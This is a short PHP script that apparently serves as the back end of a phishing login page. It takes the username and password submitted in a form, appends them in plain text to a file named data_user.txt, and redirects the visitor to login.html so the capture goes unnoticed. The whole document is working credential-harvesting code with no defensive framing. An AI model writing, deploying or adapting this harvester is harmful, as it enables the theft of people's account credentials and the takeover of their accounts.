<?php
$username = $_POST['username'];
$password = $_POST['password'];

$file = fopen("data_user.txt","a+");
fwrite($file, $username . ":" . $password . "\n");
fclose($file);
header("Location: login.html");
exit;
?>
